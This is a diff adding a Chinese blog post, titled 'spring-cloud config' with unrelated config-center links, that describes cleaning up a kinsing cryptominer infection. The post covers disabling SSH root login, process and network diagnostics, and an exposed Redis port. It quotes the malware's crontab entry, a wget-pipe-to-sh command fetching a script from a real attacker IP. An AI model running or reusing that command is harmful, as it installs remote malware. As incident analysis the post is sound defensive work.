@@ -1,0 +1,128 @@
+---
+layout: post
+title: spring-cloud config
+date: 2020-1-8 14:32:00
+categories:  java spring spring-cloud
+---
+## 1.起因
+1. 今天 查了一下 一台机器被装上了 挖矿软件.
+由于机器允许root登录，黑客可以使用ssh爆破的方式来破解密码
+
+## 2. 需要的防治
+方法: 禁止使用root登录机器
+### 1. 修改 sshd_config 将
+
+```
+PermitRootLogin yes
+```
+
+改为
+
+```
+PermitRootLogin no
+```
+### 2. 重启sshd服务
+
+```shell
+[root@iZbp15pf7sr2cgwbyqi1inZ www]# service sshd restart
+Stopping sshd:                                             [  OK  ]
+Starting sshd:                                             [  OK  ]
+```
+
+
+## 2.根本原因
+## 1. top发现有异常进程 **kinsing67xSddLA**
+```
+  PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM    TIME+  COMMAND                                                                                                              
+15406 www       20   0 1165m 204m  11m S  0.0 10.2   0:06.28 mysqld                                                                                                                 
+26335 www       20   0  896m 126m 5344 S  0.0  6.3   0:06.18 ruby                                                                                                                   
+26353 www       20   0  435m 116m 5380 S  0.0  5.8   0:10.76 ruby                                                                                                                   
+24946 www       20   0  435m 114m 3404 S  0.0  5.7   0:00.76 ruby                                                                                                                   
+27584 www       20   0  116m  31m  13m S  0.0  1.6   2:38.90 kinsing67xSddLA                                                                                                        
+ 9763 www       20   0  388m  18m 3516 S  0.0  0.9   0:01.28 ruby                                   
+```
+
+## 2. netstat -natp 查看异常进程  
+```shell
+[root@iZbp15pf7sr2cgwbyqi1inZ www]#  netstat -natp
+Active Internet connections (servers and established)
+Proto Recv-Q Send-Q Local Address               Foreign Address             State       PID/Program name   
+tcp        0      0 0.0.0.0:8000                0.0.0.0:*                   LISTEN      24946/unicorn worke 
+tcp        0      0 0.0.0.0:3306                0.0.0.0:*                   LISTEN      15406/mysqld        
+tcp        0      0 0.0.0.0:6379                0.0.0.0:*                   LISTEN      27584/./kinsing67xS 
+tcp        0      0 0.0.0.0:80                  0.0.0.0:*                   LISTEN      19251/nginx         
+tcp        0      0 0.0.0.0:22                  0.0.0.0:*                   LISTEN      31492/sshd          
+tcp        0      0 0.0.0.0:31414               0.0.0.0:*                   LISTEN      27584/./kinsing67xS 
+tcp        0      0 127.0.0.1:25                0.0.0.0:*                   LISTEN      1451/master         
+tcp        0      0 0.0.0.0:443                 0.0.0.0:*                   LISTEN      19251/nginx         
+tcp        0      0 172.16.1.7:3306             172.16.1.8:39350            ESTABLISHED 15406/mysqld        
+tcp        0      0 172.16.1.7:40742            185.178.45.221:8443         ESTABLISHED 27584/./kinsing67xS 
+tcp        0      0 172.16.1.7:3306             172.16.1.8:41520            ESTABLISHED 15406/mysqld        
+tcp        0      0 172.16.1.7:56766            100.100.30.26:80            ESTABLISHED 30171/AliYunDun     
+tcp        0      0 172.16.1.7:3306             172.16.1.8:38506            ESTABLISHED 15406/mysqld        
+tcp        0      0 172.16.1.7:3306             172.16.1.8:38666            ESTABLISHED 15406/mysqld        
+tcp        0      0 172.16.1.7:43156            193.187.174.104:8443        ESTABLISHED 27584/./kinsing67xS 
+tcp        0      0 172.16.1.7:22               222.209.189.131:4290        ESTABLISHED 27172/sshd          
+tcp        0      0 172.16.1.7:38366            139.99.50.255:80            ESTABLISHED 27584/./kinsing67xS 
+tcp        0      0 172.16.1.7:3306             172.16.1.8:38748            ESTABLISHED 15406/mysqld        
+tcp        0    784 172.16.1.7:22               222.209.189.131:4291        ESTABLISHED 31193/sshd          
+tcp        0      0 172.16.1.7:3306             172.16.1.8:38756            ESTABLISHED 15406/mysqld        
+
+```
+kinsing67xS 链接的几个ip: 185.178.45.221 ,193.187.174.104, 139.99.50.255来自乌克兰，新加坡等地。
+
+## 3. lsof -p pid 查看进程打开的文件
+发现 这个进程打开了 /home/www/programs/redis-5.0.3/中的文件，应该是redis 端口暴露在公网，被人黑了。
+```
+[root@iZbp15pf7sr2cgwbyqi1inZ www]# lsof -p 27584
+COMMAND     PID USER   FD   TYPE   DEVICE SIZE/OFF     NODE NAME
+kinsing67 27584  www  cwd    DIR    252,1     4096  1577830 /home/www/programs/redis-5.0.3
+kinsing67 27584  www  rtd    DIR    252,1     4096        2 /
+kinsing67 27584  www  txt    REG    252,1 17072128  1578766 /home/www/programs/redis-5.0.3/kinsing67xSddLA5D
+kinsing67 27584  www    0r   CHR      1,3      0t0     3839 /dev/null
+kinsing67 27584  www    1w   CHR      1,3      0t0     3839 /dev/null
+kinsing67 27584  www    2w   CHR      1,3      0t0     3839 /dev/null
+kinsing67 27584  www    3r  FIFO      0,8      0t0  2601435 pipe
+kinsing67 27584  www    4w  FIFO      0,8      0t0  2601435 pipe
+kinsing67 27584  www    5u   REG      0,9        0     3835 [eventpoll]
+kinsing67 27584  www    6u   CHR    136,6      0t0        9 /dev/pts/6 (deleted)
+kinsing67 27584  www    7u  IPv4  2601436      0t0      TCP *:6379 (LISTEN)
+kinsing67 27584  www    8u  sock      0,6      0t0 15400198 can't identify protocol
+kinsing67 27584  www    9u  sock      0,6      0t0 15400200 can't identify protocol
+kinsing67 27584  www   10u  sock      0,6      0t0 15400192 can't identify protocol
+kinsing67 27584  www   11u  sock      0,6      0t0 15400194 can't identify protocol
+kinsing67 27584  www   12u  sock      0,6      0t0 15400202 can't identify protocol
+kinsing67 27584  www   13u  sock      0,6      0t0 15400196 can't identify protocol
+kinsing67 27584  www   14u  sock      0,6      0t0 15400189 can't identify protocol
+kinsing67 27584  www   15u  sock      0,6      0t0 15400204 can't identify protocol
+kinsing67 27584  www   16u  sock      0,6      0t0 15400207 can't identify protocol
+kinsing67 27584  www   17uW  REG    252,1        0   272052 /tmp/linux.lock
+kinsing67 27584  www   18u   REG      0,9        0     3835 [eventpoll]
+kinsing67 27584  www   19r   CHR      1,9      0t0     3844 /dev/urandom
+kinsing67 27584  www   20u   REG    252,1        0   532729 /tmp/.ICEd-unix/059834732 (deleted)
+kinsing67 27584  www   21u  IPv4 15400411      0t0      TCP *:31414 (LISTEN)
+kinsing67 27584  www   22u   REG    252,1        0   532730 /tmp/.ICEd-unix/633094107 (deleted)
+kinsing67 27584  www   23u  IPv4 18335817      0t0      TCP iZbp15pf7sr2cgwbyqi1inZ:38358->ip255.ip-139-99-50.net:http (ESTABLISHED)
+kinsing67 27584  www   24u   REG    252,1        0   532731 /tmp/.ICEd-unix/065547646 (deleted)
+kinsing67 27584  www   25u   REG    252,1        0   532732 /tmp/.ICEd-unix/489642693 (deleted)
+kinsing67 27584  www   26u  IPv4 18336907      0t0      TCP iZbp15pf7sr2cgwbyqi1inZ:38366->ip255.ip-139-99-50.net:http (ESTABLISHED)
+kinsing67 27584  www   27u   REG    252,1        0   532735 /tmp/.ICEd-unix/141981024 (deleted)
+kinsing67 27584  www   28u  IPv4 18334697      0t0      TCP iZbp15pf7sr2cgwbyqi1inZ:40742->vds-cv21661.timeweb.ru:pcsync-https (ESTABLISHED)
+kinsing67 27584  www   29u   REG    252,1        0   532737 /tmp/.ICEd-unix/610949951 (deleted)
+kinsing67 27584  www   30u  IPv4 17568242      0t0      TCP iZbp15pf7sr2cgwbyqi1inZ:43156->193.187.174.104:pcsync-https (ESTABLISHED)
+
+``` 
+
+## 4.定时任务
+挖矿脚本大概率定时在你的crontab里面。
+crontab -l 发现定时任务
+```shell
+* * * * * wget -q -O - http://195.3.146.118/unk.sh | sh > /dev/null 2>&1
+```
+
+## 参考
+[taobao 一篇好TM长的关于配置中心的文章](http://jm.taobao.org/2016/09/28/an-article-about-config-center/)   
+[Spring Cloud Config - 统一配置中心](https://blog.51cto.com/zero01/2171735)
+
+
+
